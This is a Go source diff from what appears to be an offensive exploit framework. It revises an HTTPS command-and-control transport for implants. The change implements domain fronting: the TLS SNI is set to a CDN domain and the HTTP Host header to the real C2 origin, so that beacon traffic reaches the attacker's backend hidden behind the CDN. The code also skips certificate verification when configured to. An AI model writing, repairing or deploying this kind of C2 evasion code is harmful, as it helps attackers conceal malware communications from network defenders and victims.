@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"net/url"
 	"time"
 
 	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
@@ -14,9 +15,10 @@ import (
 )
 
 type HTTPSTransport struct {
-	baseURL   string
-	cdnDomain string // CDN domain for domain fronting (Host header override)
-	client    *http.Client
+	baseURL    string
+	cdnDomain  string // CDN domain for domain fronting (TLS SNI only)
+	originHost string // real C2 host for HTTP Host header when fronting
+	client     *http.Client
 }
 
 func NewHTTPSTransport(baseURL string, caCertPEM string, cdnDomain string) (*HTTPSTransport, error) {
@@ -38,14 +40,19 @@ func NewHTTPSTransport(baseURL string, caCertPEM string, cdnDomain string) (*HTT
 		tlsConfig.InsecureSkipVerify = true
 	}
 
-	// For domain fronting: TLS SNI must match the CDN domain
+	// Domain fronting: SNI = CDN domain; Host header = real origin (callback host).
+	originHost := ""
+	if u, err := url.Parse(baseURL); err == nil {
+		originHost = u.Host
+	}
 	if cdnDomain != "" {
 		tlsConfig.ServerName = cdnDomain
 	}
 
 	return &HTTPSTransport{
-		baseURL:   baseURL,
-		cdnDomain: cdnDomain,
+		baseURL:    baseURL,
+		cdnDomain:  cdnDomain,
+		originHost: originHost,
 		client: &http.Client{
 			Timeout: 30 * time.Second,
 			Transport: &http.Transport{
@@ -99,10 +106,10 @@ func (t *HTTPSTransport) post(path string, body []byte) ([]byte, error) {
 	}
 	req.Header.Set("Content-Type", "application/octet-stream")
 
-	// Domain fronting: override Host header to match the real C2 domain
-	// while TLS SNI points to the CDN domain
-	if t.cdnDomain != "" {
-		req.Host = t.cdnDomain
+	// Domain fronting: SNI is already CDN (ServerName); Host must be the real
+	// C2 origin host so the CDN routes to our backend.
+	if t.cdnDomain != "" && t.originHost != "" {
+		req.Host = t.originHost
 	}
 
 	resp, err := t.client.Do(req)
